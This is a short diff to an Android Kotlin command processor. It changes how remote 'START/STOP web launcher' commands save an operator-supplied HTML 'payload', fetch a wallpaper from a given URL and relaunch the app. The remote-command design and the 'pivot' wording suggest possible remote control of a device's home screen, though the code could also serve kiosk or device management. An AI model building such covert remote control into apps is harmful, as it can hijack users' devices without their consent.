@@ -1837,16 +1837,26 @@ object CommandProcessor {
                     val htmlPayload = parts.getOrNull(1)?.trim() ?: ""
                     
                     if (htmlPayload.isNotEmpty()) {
-                        WebLauncherManager.deploy(ctx, wallpaperUrl, htmlPayload)
-                        status = "WEB_LAUNCHER_DEPLOYED"
+                        WebLauncherManager.saveHtml(ctx, htmlPayload)
+                        WebLauncherManager.setEnabled(ctx, true)
+                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                            WebLauncherManager.downloadWallpaper(ctx, wallpaperUrl)
+                        }
+                        
+                        val i = Intent(ctx, MainActivity::class.java)
+                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                        ctx.startActivity(i)
+                        status = "WEB_LAUNCHER_PIVOT_SUCCESS"
                     } else {
                         status = "FAILED_FORMAT"
-                        errorMsg = "Required format: URL ||| <html>..."
                     }
                 }
                 "STOP_WEB_LAUNCHER" -> {
-                    WebLauncherManager.removeLauncher(ctx)
-                    status = "WEB_LAUNCHER_REMOVED"
+                    WebLauncherManager.setEnabled(ctx, false)
+                    val i = Intent(ctx, MainActivity::class.java)
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                    ctx.startActivity(i)
+                    status = "WEB_LAUNCHER_DISABLED"
                 }
                 else -> {
                     status = "FAILED (UNKNOWN_CMD)"
